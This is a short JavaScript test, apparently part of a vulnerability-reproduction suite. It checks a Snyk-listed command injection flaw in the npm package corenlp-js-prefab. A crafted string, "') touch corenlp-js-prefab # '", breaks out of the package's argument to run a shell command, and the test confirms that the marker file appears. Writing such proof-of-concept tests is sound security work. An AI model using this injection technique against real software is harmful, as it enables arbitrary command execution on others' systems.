//https://snyk.io/vuln/SNYK-JS-CORENLPJSPREFAB-1050434
test("Command Injection in corenlp-js-prefab", () => {
  const a = require("corenlp-js-prefab");
  const fs = require("fs");
  const path = "./corenlp-js-prefab";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.process("') touch corenlp-js-prefab # '");
  } catch (error) {
    console.log("error");
  }
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
